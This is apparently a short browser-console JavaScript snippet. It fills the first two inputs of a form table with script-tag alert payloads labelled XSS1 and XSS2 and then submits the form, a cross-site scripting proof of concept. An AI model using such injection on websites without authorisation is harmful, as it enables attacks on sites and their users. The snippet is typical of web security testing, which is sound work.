akk = [].slice.call(document.querySelectorAll('form table tbody tr td input'));
akk[0].value = '<script>alert("XSS1")</script>';
akk[1].value = '<script>alert("XSS2")</script>';
document.querySelector('form').submit();